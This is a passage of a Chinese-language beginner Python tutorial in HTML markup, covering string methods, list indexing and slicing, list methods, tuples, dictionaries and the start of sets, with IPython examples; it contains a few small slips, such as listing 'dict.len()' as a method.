str'</span>, <span class="string">'ng example'</span>, <span class="string">''</span>]</span><br></pre></td></tr></table></figure></li></ul></li><li><p>len()方法</p><p>Python len() 方法返回对象（字符、列表、元组等）长度或项目个数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">42</span>]: str = <span class="string">"i love python"</span>                               </span><br><span class="line"></span><br><span class="line">In [<span class="number">43</span>]: print(len(str))                                     </span><br><span class="line"><span class="number">13</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">44</span>]: List = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>]                                    </span><br><span class="line"></span><br><span class="line">In [<span class="number">45</span>]: print(len(List))                                    </span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure></li><li><p>lower()方法 </p><p>Python lower() 方法转换字符串中所有大写字符为小写。</p></li><li><p>upper()方法 </p><p>Python upper() 方法转换字符串中所有小写字符为大写。</p></li><li><p>isnumeric()方法</p><p>如果 string 中只包含数字字符，则返回 True，否则返回 False</p></li><li><p>isspace()方法</p><p>如果 string 中只包含空格，则返回 True，否则返回 False.</p></li></ol><ul><li><p>字符格式化操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">46</span>]: age = <span class="number">100</span>                                           </span><br><span class="line"></span><br><span class="line">In [<span class="number">47</span>]: str = <span class="string">"python"</span>                                      </span><br><span class="line"></span><br><span class="line">In [<span class="number">48</span>]: print(<span class="string">"今年%d岁"</span>%age,<span class="string">"the string %s"</span>%str)</span><br></pre></td></tr></table></figure></li></ul><h4 id="列表-（list）"><a href="#列表-（list）" class="headerlink" title="列表 （list）"></a>列表 （list）</h4><p>当我们需要存储一组数据时候，就需要用序列，序列给每个元素都分配一个索引，第一个是0，第二个是1，依次论推。常用的序列有：列表和元组，当我们需要改变序列的元素时候，就用列表，因为某些原因，序列不能修改时候，使用元组更加合适。</p><p>创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可。列表的数据项不需要具有相同的类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">49</span>]: list1 = [<span class="string">"yqq"</span>, <span class="string">"boy"</span>, <span class="number">27</span>]                          </span><br><span class="line"></span><br><span class="line">In [<span class="number">50</span>]: list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]                                </span><br><span class="line"></span><br><span class="line">In [<span class="number">51</span>]: list3 = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>]</span><br></pre></td></tr></table></figure><ul><li><p>python列表的索引</p><p>可以通过下标访问列表中的值，也能通过下标来重新赋值。字符串不能通过下边类重新赋值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [52]: list1 &#x3D; [&quot;yqq&quot;, &quot;boy&quot;, 27]                          </span><br><span class="line"></span><br><span class="line">In [53]: list1[1] &#x3D; &quot;girl&quot;                                   </span><br><span class="line"></span><br><span class="line">In [54]: print(list1)                                        </span><br><span class="line">[&#39;yqq&#39;, &#39;girl&#39;, 27]</span><br><span class="line"></span><br><span class="line">In [55]: str &#x3D; &quot;4444&quot;                                        </span><br><span class="line"></span><br><span class="line">In [56]: str[0]&#x3D;&quot;5&quot;                                          </span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">TypeError                   Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input-56-3975e41ea07c&gt; in &lt;module&gt;</span><br><span class="line">----&gt; 1 str[0]&#x3D;&quot;5&quot;</span><br><span class="line"></span><br><span class="line">TypeError: &#39;str&#39; object does not support item assignment</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>python列表的分片</p><p>使用索引可以实现单个元素的访问，分片可以操作一定范围的元素。</p><p>格式：list[n, m]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n: 提取部分的第一个元素的编号。</span><br><span class="line">m: 分片剩余部分的第一个元素的编号。</span><br><span class="line">第一个是分片的开始，m-n 是分片的个数（n:包含在分片中，m不包含字啊分片中）</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">57</span>]: list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]                       </span><br><span class="line"></span><br><span class="line">In [<span class="number">58</span>]: print(list[<span class="number">3</span>:<span class="number">6</span>])                                    </span><br><span class="line">[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">59</span>]: print(list[<span class="number">0</span>:<span class="number">1</span>])                                    </span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">60</span>]: print(list[<span class="number">7</span>:<span class="number">10</span>])                                   </span><br><span class="line">[<span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">61</span>]: print(list[<span class="number">-3</span>:])                                    </span><br><span class="line">[<span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">62</span>]: print(list[<span class="number">-1</span>:])                                    </span><br><span class="line">[<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">63</span>]: print(list[<span class="number">-1</span>])                                     </span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure><p>可以在分片时候，指定步长，步长可以为正数，也可以是负数。步长为负数，从右向左提取元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">64</span>]: list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]                       </span><br><span class="line"></span><br><span class="line">In [<span class="number">65</span>]: print(list[::<span class="number">2</span>])                                    </span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">66</span>]: print(list[::<span class="number">-1</span>])                                   </span><br><span class="line">[<span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">67</span>]: print(list[<span class="number">8</span>:<span class="number">3</span>:<span class="number">-1</span>])                                 </span><br><span class="line">[<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">68</span>]: print(list[<span class="number">0</span>:<span class="number">10</span>:<span class="number">-2</span>])                                </span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">In [<span class="number">69</span>]: print(list[<span class="number">5</span>::<span class="number">-2</span>])                                  </span><br><span class="line">[<span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">70</span>]: print(list[:<span class="number">5</span>:<span class="number">-2</span>])                                  </span><br><span class="line">[<span class="number">10</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure></li><li><p>序列相加</p><p>只有相同类型的序列才能相加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">71</span>]: [<span class="number">1</span>,<span class="number">2</span>]+[<span class="number">3</span>,<span class="number">4</span>]                                         </span><br><span class="line">Out[<span class="number">71</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">72</span>]: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]+<span class="string">"hello"</span>                                     </span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">TypeError                   Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-72</span><span class="number">-2</span>fc4711a9bef&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; 1 [1,2,3]+"hello"</span><br><span class="line"></span><br><span class="line">TypeError: can only concatenate list (<span class="keyword">not</span> <span class="string">"str"</span>) to list</span><br></pre></td></tr></table></figure></li><li><p>序列迭代</p><p>依次输出列表的元素</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [75]: for x in [1, 2, 3]: </span><br><span class="line">    ...:      print(x) </span><br><span class="line">    ...:                                                     </span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure></li><li><p>删除元素</p><p>del 语句来删除元素</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [76]: list1 &#x3D; [&#39;physics&#39;, &#39;chemistry&#39;, 1997, 2000]        </span><br><span class="line"></span><br><span class="line">In [77]: del list1[2]                                        </span><br><span class="line"></span><br><span class="line">In [78]: list1                                               </span><br><span class="line">Out[78]: [&#39;physics&#39;, &#39;chemistry&#39;, 2000]</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>python列表的函数</p><ol><li><p>len(list) 列表元素个数</p></li><li><p>max(list) 列表元素的最大值</p></li><li><p>min(list) 列表元素的最小值</p></li><li><p>list(seq)  把seq转化为列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: aTuple = (<span class="number">123</span>, <span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="string">'Taobao'</span>)         </span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: list1 = list(aTuple)                                 </span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="keyword">print</span> (<span class="string">"列表元素 : "</span>, list1)                         </span><br><span class="line">列表元素 :  [<span class="number">123</span>, <span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="string">'Taobao'</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: str=<span class="string">"Hello World"</span>                                    </span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: list2=list(str)</span><br></pre></td></tr></table></figure></li></ol></li></ul><ul><li><p>python列表包含的函数</p><ol><li><p>list.append(obj)  </p><p>列表的末尾添加新的对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [6]: List &#x3D;[1,2,3,4]                                      </span><br><span class="line"></span><br><span class="line">In [7]: List1 &#x3D;[3,4,5]                                       </span><br><span class="line"></span><br><span class="line">In [8]: List.append(5)                                       </span><br><span class="line"></span><br><span class="line">In [9]: print(List)                                          </span><br><span class="line">[1, 2, 3, 4, 5]</span><br><span class="line"></span><br><span class="line">In [10]: List.append(List1)                                  </span><br><span class="line"></span><br><span class="line">In [11]: print(List)                                         </span><br><span class="line">[1, 2, 3, 4, 5, [3, 4, 5]]</span><br></pre></td></tr></table></figure></li><li><p>list.extend(seq)</p><p>在列表末尾一次性追加另一个序列中的多个值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">12</span>]: List =[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]                                     </span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: List1 =[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]                                      </span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: List.extend(List1)                                  </span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: print(List)                                         </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: List.append(List1)                                  </span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: print(List)                                         </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]]</span><br></pre></td></tr></table></figure></li><li><p>list.insert(index,obj)</p><p>函数用于将指定对象插入列表的指定位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">18</span>]: List =[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]                                     </span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: List1 =[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]                                      </span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: List.insert(<span class="number">3</span>, List1)                               </span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: print(List)                                         </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], <span class="number">4</span>]</span><br></pre></td></tr></table></figure></li><li><p>list.insert(index,obj)</p><p>函数用于将指定对象插入列表的指定位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [22]: List &#x3D;[1,2,3,4]                                     </span><br><span class="line"></span><br><span class="line">In [23]: List1 &#x3D;[3,4,5]                                      </span><br><span class="line"></span><br><span class="line">In [24]: List.insert(3, List1)                               </span><br><span class="line"></span><br><span class="line">In [25]: print(List)                                         </span><br><span class="line">[1, 2, 3, [3, 4, 5], 4]</span><br></pre></td></tr></table></figure></li><li><p>list.pop()</p><p>函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">26</span>]: list1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]                           </span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: list1.pop()                                         </span><br><span class="line">Out[<span class="number">27</span>]: <span class="number">8</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">28</span>]: list1                                               </span><br><span class="line">Out[<span class="number">28</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure></li></ol></li></ul><ol start="6"><li><p>list.remove(obj)</p><p>函数用于移除列表中某个值的第一个匹配项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">29</span>]: list1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]                           </span><br><span class="line"></span><br><span class="line">In [<span class="number">30</span>]: list1.remove(<span class="number">6</span>)                                     </span><br><span class="line"></span><br><span class="line">In [<span class="number">31</span>]: list1                                               </span><br><span class="line">Out[<span class="number">31</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure></li></ol><ol start="7"><li><p>list.count(obj)</p><p>用于统计某个元素在列表中出现的次数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">38</span>]: list1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]                           </span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]: list1.count(<span class="number">6</span>)                                      </span><br><span class="line">Out[<span class="number">39</span>]: <span class="number">2</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="元组-（tuple）"><a href="#元组-（tuple）" class="headerlink" title="元组 （tuple）"></a>元组 （tuple）</h4><p>某些情况下，我们需要的序列不可修改，这个时候，就需要用元组，元组和列表相似，但是元组的元素值不可修改也不能删除，可以进行分片和连接。</p><p>元组创建很简单，用小括号括起来，用逗号隔开。元组使用小括号，列表使用中括号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">45</span>]: Tuple = (<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>)</span><br></pre></td></tr></table></figure><p>注意：一个元素的元组，后边加一个“,”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">47</span>]: Tuple =(<span class="number">30</span>,)</span><br></pre></td></tr></table></figure><ul><li>访问元组</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;In [<span class="number">48</span>]: tuple = (<span class="string">"abcd"</span>,<span class="number">1</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>])                          </span><br><span class="line"></span><br><span class="line">In [<span class="number">49</span>]: tuple[<span class="number">0</span>]                                            </span><br><span class="line">Out[<span class="number">49</span>]: <span class="string">'abcd'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">50</span>]: tuple[<span class="number">1</span>]                                            </span><br><span class="line">Out[<span class="number">50</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">51</span>]: tuple[<span class="number">2</span>]                                            </span><br><span class="line">Out[<span class="number">51</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><ul><li><p>元组合并</p><p>  In [52]: tuple = (“abcd”,1,[1,2,4])                          </p><p>  In [53]: tuple1 =(“ad”,3,4)                                  </p><p>  In [54]: tuple + tuple1<br>  Out[54]: (‘abcd’, 1, [1, 2, 4], ‘ad’, 3, 4)</p></li><li><p>删除元组</p><p>元组的元素不允许删除，但是我们可以删除整个元组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [55]: tuple &#x3D; (&quot;abcd&quot;,1,[1,2,4])                          </span><br><span class="line"></span><br><span class="line">In [56]: del tuple</span><br></pre></td></tr></table></figure></li><li><p>任意的以“，”分开的序列，默认是元组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [57]: a &#x3D; 1,2,3,4                                         </span><br><span class="line"></span><br><span class="line">In [58]: a                                                   </span><br><span class="line">Out[58]: (1, 2, 3, 4)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>元组的函数</p><ol><li><p>tuple()方法</p><p>Python 元组 tuple() 函数将列表转换为元组。</p></li></ol></li></ul><h4 id="字典-（dict）"><a href="#字典-（dict）" class="headerlink" title="字典 （dict）"></a>字典 （dict）</h4><p>列表中元素通过下标进行定位，但是元素位置发生变化，则很难定位，python提供一种新的类型，那就是字典。字典中元素可以通过 key 访问。</p><p>说明：</p><p>字典是由花括号括起来的包含，key : value 两部分。 dict = {‘name’:’班长’, ‘id’:100, ‘sex’:’f’, ‘address’:’地球亚洲中国北京’}</p><p>字典和列表一样，也能够存储多个数据</p><p>列表中找某个元素时，是根据下标进行的</p><p>字典中找某个元素时，是根据’名字’（就是冒号:前面的那个值，例如上面代码中的’name’、’id’、’sex’）</p><ul><li><p>访问字典的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [59]: dict &#x3D; &#123;&quot;name&quot;:&quot;yqq&quot;, &quot;age&quot;:27&#125;                     </span><br><span class="line"></span><br><span class="line">In [60]: print(dict[&quot;name&quot;],dict[&quot;age&quot;])                     </span><br><span class="line">yqq 27</span><br></pre></td></tr></table></figure></li><li><p>修改字典</p><p>通过 key 来修改值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">61</span>]: dict = &#123;<span class="string">"name"</span>:<span class="string">"yqq"</span>, <span class="string">"age"</span>:<span class="number">27</span>&#125;                     </span><br><span class="line"></span><br><span class="line">In [<span class="number">62</span>]: dict[<span class="string">"age"</span>] =<span class="number">25</span>                                     </span><br><span class="line"></span><br><span class="line">In [<span class="number">63</span>]: print(dict)                                         </span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'yqq'</span>, <span class="string">'age'</span>: <span class="number">25</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">64</span>]: dict[<span class="string">"school"</span>] =<span class="string">"bj"</span>                                </span><br><span class="line"></span><br><span class="line">In [<span class="number">65</span>]: print(dict)                                         </span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'yqq'</span>, <span class="string">'age'</span>: <span class="number">25</span>, <span class="string">'school'</span>: <span class="string">'bj'</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>删除字典或者元素</p><ol><li>del dict[key] #删除 key 条目</li><li>del dict  #删除字典</li><li>dict.clear() #清除所有条目</li></ol></li></ul><ul><li>字典的方法</li></ul><ol><li><p>dict.len()</p><p>测量字典中，键值对的个数。</p></li><li><p>dict.values()    </p><p>返回一个包含字典所有value的列表</p></li><li><p>dict.keys()     </p><p>返回一个包含字典所有KEY的列表</p></li><li><p>dict.items()     </p><p>返回一个包含所有（键，值）元组的列表</p></li></ol><ul><li><p>字典的遍历</p><p>遍历键、遍历值、遍历项、遍历键值对</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">66</span>]: <span class="keyword">for</span> key <span class="keyword">in</span> dict.keys(): </span><br><span class="line">    ...:     print(key) </span><br><span class="line">    ...:                                                     </span><br><span class="line">name</span><br><span class="line">age</span><br><span class="line">school</span><br><span class="line"></span><br><span class="line">In [<span class="number">67</span>]: <span class="keyword">for</span> value <span class="keyword">in</span> dict.values(): </span><br><span class="line">    ...:     print(value) </span><br><span class="line">    ...:                                                     </span><br><span class="line">yqq</span><br><span class="line"><span class="number">25</span></span><br><span class="line">bj</span><br><span class="line"></span><br><span class="line">In [<span class="number">68</span>]: <span class="keyword">for</span> item <span class="keyword">in</span> dict.items(): </span><br><span class="line">    ...:     print(item) </span><br><span class="line">    ...:                                                     </span><br><span class="line">(<span class="string">'name'</span>, <span class="string">'yqq'</span>)</span><br><span class="line">(<span class="string">'age'</span>, <span class="number">25</span>)</span><br><span class="line">(<span class="string">'school'</span>, <span class="string">'bj'</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">69</span>]: <span class="keyword">for</span> key,value <span class="keyword">in</span> dict.items(): </span><br><span class="line">    ...:     print(<span class="string">"key=%s"</span>%key,<span class="string">"value=%s"</span>%value) </span><br><span class="line">    ...:                                                     </span><br><span class="line">key=name value=yqq</span><br><span class="line">key=age value=<span class="number">25</span></span><br><span class="line">key=school value=bj</span><br></pre></td></tr></table></figure><h4 id="集合-（set）"><a href="#集合-（set）" class="headerlink" title="集合 （set）"></a>集合 （set）</h4><p>集合（set）是一个无序的不重复元素序列。</p><p>可以使用大括号 { } 或者 set(#可迭代对象) 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">72</span>]: a=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">6</span>&#125;                                   </span><br><span class="line"></span><br><span class="line">In [<span class="number">73</span>]: a                                                   </span><br><span class="line">Out[<span class="number">73</span>]: &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span 